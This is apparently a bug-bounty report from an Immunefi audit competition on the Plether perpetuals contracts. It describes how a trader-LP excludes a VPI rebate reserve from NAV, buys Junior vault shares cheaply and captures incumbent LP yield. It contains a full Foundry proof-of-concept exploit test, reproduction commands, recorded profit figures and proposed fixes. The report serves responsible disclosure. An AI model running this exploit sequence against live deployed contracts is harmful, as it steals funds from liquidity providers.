# \#98407 [SC-Critical] # [HIGH] VPI reserve NAV exclusion lets a trader-LP steal incumbent LP revenue

**Submitted on Nov 7th 2026 at 18:40:27 UTC by @dtutila for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98407
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

# [HIGH] VPI reserve NAV exclusion lets a trader-LP steal incumbent LP revenue

## Summary

An attacker can remove already-collected VPI revenue from HousePool, deposit into Junior while
that value is excluded from NAV, and capture part of the revenue when the active lifetime clamp
returns it. The PoC realizes attacker profit and incumbent loss through the full deposit and
redemption lifecycle.

## Bug Description

This is not the documented carry policy. Pending carry is trader debt that has not entered LP NAV.
Here, the VPI revenue was already collected into HousePool and belonged to incumbent LPs.

A skew-reducing trade pays that cash to the attacker and locks an equal amount in the attacker's
nonwithdrawable VPI reserve. The reserve is fully funded but excluded from deposit NAV. The attacker
then deposits into Junior at the reduced NAV and closes at the same mark. The lifetime clamp is
active and returns the entire reserve after the attacker owns most Junior shares.

The mint itself is value-neutral. The loss occurs because attacker-controlled removal and return of
already-collected cash straddles a change in LP ownership.

At commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

1. A third-party short creates skew and pays positive VPI into HousePool.
2. The attacker opens the opposite long. HousePool pays an `8,001.60 USDG` rebate and the
   clearinghouse locks the same amount as the attacker's VPI reserve.
3. The attacker deposits `10,000,000 USDG` into Junior while that reserve is outside NAV.
4. A same-mark close consumes the reserve back into HousePool through the lifetime clamp.
5. The attacker completes the normal cooldown, redemption, settlement, and claim flow.

Code anchors:

- Pool rebate and reserve lock: `CfdEngineSettlementSidecar.sol:442-470`.
- Active lifetime clamp: `CloseAccountingLib.sol:103-118`.
- Reserve return to HousePool: `CfdEngineSettlementSidecar.sol:690-697`.

### Known-issue distinctions

- `ACCOUNTING_SPEC.md:731-740` accepts sharing pending carry collected after activation. It does
  not accept removing cash that was already collected, repricing entry, and recollecting it.
- `SECURITY.md:1434-1444` says the lifetime clamp prevents rebate-only round trips. This attack
  succeeds while the clamp is active because LP ownership changes before the reserve returns.
- `SCAS-PRE-2026-10-H1` concerns a missing Senior-coupon checkpoint. Its fix does not stop this
  reserve sequence, and reserve-aware NAV does not fix H1.

## Impact

**Severity: High — theft of incumbent LP yield.**

This is direct theft of unclaimed LP yield. It breaks the collection-time ownership invariant:
cash already collected for incumbent LPs must not become claimable by a later LP cohort.

One release-parameter cycle records:

- Attacker combined profit: **+3,343.660494 USDG**.
- Incumbent Junior loss: **-6,736.022150 USDG**.
- Attacker realized LP exit: **10,006,553.001602 USDG**.
- Control without reserve removal and return: **-121.693242 USDG**.

The loss is permanent after redemption and can recur whenever third-party skew reforms. Each cycle
is bounded by the VPI curve to at most 8 bps of pool depth at the release skew cap.

The PoC uses a deterministic Router-authenticated handler call rather than reproducing external
commit timing. The public Router reaches the same planner and handler. Conservative Router costs
are approximately `1,170 USDG`, below the recorded profit. Directional hedging cost is not modeled.

## Proof of Concept

Attach the primary PoC `VpiReserveCohort.t.sol` (SHA-256
`fe26e711260cead135758a7ae8886651f02c34f2e71347077828a6db8e7d150a`).

```bash
git clone https://github.com/immunefi-team/audit-comp-plether target
cd target
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
npm ci --ignore-scripts
mkdir -p test
cp VpiReserveCohort.t.sol test/
forge test --match-path test/VpiReserveCohort.t.sol -vvvv
```

The PoC only adds this test file; it does not modify protocol contracts or configuration.

Proving tests:

- `test_IncomingLpCapturesBackedVpiClawbackAndNetsPositiveAfterFees`
- `test_Control_LpDepositWithoutRebateLegDoesNotReproduceExtraction`

Recorded output:

```text
reserved VPI clawback 8001600000
attacker realized LP exit 10006553001602
net cross-role profit 3343660494
incumbent Junior value loss 6736022150
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Values are six-decimal USDG atoms. The clean run used the pinned target and no public network.

## Recommended Mitigation

Include the funded VPI reserve in deposit NAV until it returns to HousePool. This preserves the
incumbent cohort's ownership while keeping the reserve available for the lifetime clamp.

Alternatively, attribute the returned reserve to the share supply that existed when the rebate was
paid. Either fix must prevent an account from buying a claim on cash it temporarily removed from
the pool.


## Link to Proof of Concept

https://gist.github.com/dtutila/4b7f7e7961502c56198a897f1db8e04d

## Proof of Concept

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Candidate: a trader delays a fully backed negative-VPI clawback until
///         after its own LP deposit activates, buying into the pool before the
///         guaranteed reserve returns and capturing incumbent LP value.
contract VpiReserveCohortTest is BasePerpTest {
    address internal constant INCUMBENT_SENIOR = address(0x1111);
    address internal constant INCUMBENT_JUNIOR = address(0x1112);
    address internal constant SKEW_TRADER = address(0x2222);
    address internal constant ATTACKER = address(0x3333);

    uint256 internal constant INCUMBENT_SENIOR_ASSETS = 8_000_000e6;
    uint256 internal constant INCUMBENT_JUNIOR_ASSETS = 2_000_000e6;
    uint256 internal constant ATTACKER_LP_ASSETS = 10_000_000e6;
    uint256 internal constant TRADER_MARGIN = 200_000e6;
    uint256 internal constant PRICE = 1e8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_IncomingLpCapturesBackedVpiClawbackAndNetsPositiveAfterFees() public {
        _fundSenior(INCUMBENT_SENIOR, INCUMBENT_SENIOR_ASSETS);
        _fundJunior(INCUMBENT_JUNIOR, INCUMBENT_JUNIOR_ASSETS);
        _fundTrader(SKEW_TRADER, TRADER_MARGIN);
        _fundTrader(ATTACKER, TRADER_MARGIN);

        uint256 initialCombinedAssets = TRADER_MARGIN + ATTACKER_LP_ASSETS;
        uint256 depth = pool.totalAssets();
        uint256 tradeSize = ((depth * 4 / 10) / 100e6) * 100e18;
        assertGt(tradeSize, 4_000_000e18, "fixture includes seeded depth");

        // A natural counterparty first creates the maximum release-parameter skew.
        _open(SKEW_TRADER, CfdTypes.Side.SHORT, tradeSize, TRADER_MARGIN / 2, PRICE, depth);
        uint256 poolBeforeRebate = pool.totalAssets();
        uint256 incumbentShares = juniorVault.balanceOf(INCUMBENT_JUNIOR);
        uint256 incumbentValueBeforeAttack = juniorVault.convertToAssets(incumbentShares);

        // The attacker reduces the skew. The pool pays a negative-VPI rebate,
        // while an equal gross clawback is locked outside HousePool NAV.
        _open(ATTACKER, CfdTypes.Side.LONG, tradeSize, TRADER_MARGIN / 2, PRICE, depth);
        (,,,,,, int256 accruedVpi) = engine.positions(ATTACKER);
        assertLt(accruedVpi, 0, "attacker must hold a negative lifetime VPI obligation");
        uint256 reserveAssets = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        assertEq(reserveAssets, uint256(-accruedVpi), "gross clawback is fully reserved");

        uint256 poolAfterRebate = pool.totalAssets();
        assertLt(poolAfterRebate, poolBeforeRebate, "rebate removes previously collected LP revenue before pricing");

        // The same actor buys Junior shares while the guaranteed clawback is
        // excluded from both HousePool assets and TerminalNavBook NAV.
        _fundJunior(ATTACKER, ATTACKER_LP_ASSETS);
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        uint256 lpValueBeforeClose = juniorVault.convertToAssets(attackerShares);

        // Closing at the same mark consumes the full reserve and returns it to
        // the pool. The lifetime clamp makes this independent of the now-deeper
        // pool's smaller instantaneous VPI curve.
        _close(ATTACKER, CfdTypes.Side.LONG, tradeSize, PRICE, pool.totalAssets());

        uint256 lpValueAfterClose = juniorVault.convertToAssets(attackerShares);
        uint256 incumbentValueAfterClose = juniorVault.convertToAssets(incumbentShares);

        // Realize the quoted LP gain through the full asynchronous redemption
        // lifecycle after the production cooldown and a second epoch boundary.
        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(ATTACKER);
        uint256 redeemEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(redeemEpoch));
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemEpoch, ATTACKER);
        assertEq(claimableShares, attackerShares, "attacker redemption is fully funded");
        vm.prank(ATTACKER);
        uint256 realizedLpExit = juniorVault.claimRedeem(redeemEpoch, claimableShares, ATTACKER, ATTACKER);

        uint256 finalCombinedAssets = clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER);

        console2.log("reserved VPI clawback", reserveAssets);
        console2.log("attacker LP value before close", lpValueBeforeClose);
        console2.log("attacker LP value after close", lpValueAfterClose);
        console2.log("attacker realized LP exit", realizedLpExit);
        console2.log("attacker combined starting assets", initialCombinedAssets);
        console2.log("attacker combined final assets", finalCombinedAssets);
        console2.log("net cross-role profit", finalCombinedAssets - initialCombinedAssets);
        console2.log("incumbent Junior value before attack", incumbentValueBeforeAttack);
        console2.log("incumbent Junior value after clawback", incumbentValueAfterClose);
        console2.log("incumbent Junior value loss", incumbentValueBeforeAttack - incumbentValueAfterClose);

        assertGt(lpValueAfterClose, lpValueBeforeClose, "incoming LP captures part of the old VPI clawback");
        assertLt(incumbentValueAfterClose, incumbentValueBeforeAttack, "incumbent Junior loses old VPI value");
        assertGt(finalCombinedAssets, initialCombinedAssets, "captured incumbent value exceeds round-trip fees");
    }

    /// @notice Control: the same LP lifecycle around the same natural skew, but
    ///         without the attacker extracting and later returning a VPI reserve.
    ///         This isolates ordinary carry/coupon/maintenance-fee effects.
    function test_Control_LpDepositWithoutRebateLegDoesNotReproduceExtraction() public {
        _fundSenior(INCUMBENT_SENIOR, INCUMBENT_SENIOR_ASSETS);
        _fundJunior(INCUMBENT_JUNIOR, INCUMBENT_JUNIOR_ASSETS);
        _fundTrader(SKEW_TRADER, TRADER_MARGIN);

        uint256 depth = pool.totalAssets();
        uint256 tradeSize = ((depth * 4 / 10) / 100e6) * 100e18;
        _open(SKEW_TRADER, CfdTypes.Side.SHORT, tradeSize, TRADER_MARGIN / 2, PRICE, depth);

        uint256 attackerStart = ATTACKER_LP_ASSETS;
        _fundJunior(ATTACKER, ATTACKER_LP_ASSETS);
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);

        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(ATTACKER);
        uint256 redeemEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(redeemEpoch));
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemEpoch, ATTACKER);
        vm.prank(ATTACKER);
        uint256 realizedLpExit = juniorVault.claimRedeem(redeemEpoch, claimableShares, ATTACKER, ATTACKER);

        uint256 controlFinal = settlementToken.balanceOf(ATTACKER);
        console2.log("control LP starting assets", attackerStart);
        console2.log("control realized LP exit", realizedLpExit);
        console2.log("control final assets", controlFinal);
        console2.log("control LP value loss", attackerStart - controlFinal);

        assertLt(controlFinal, attackerStart, "control should pay normal LP lifecycle costs");
        assertLt(attackerStart - controlFinal, 500e6, "ordinary lifecycle effects stay far below exploit profit");
    }
}

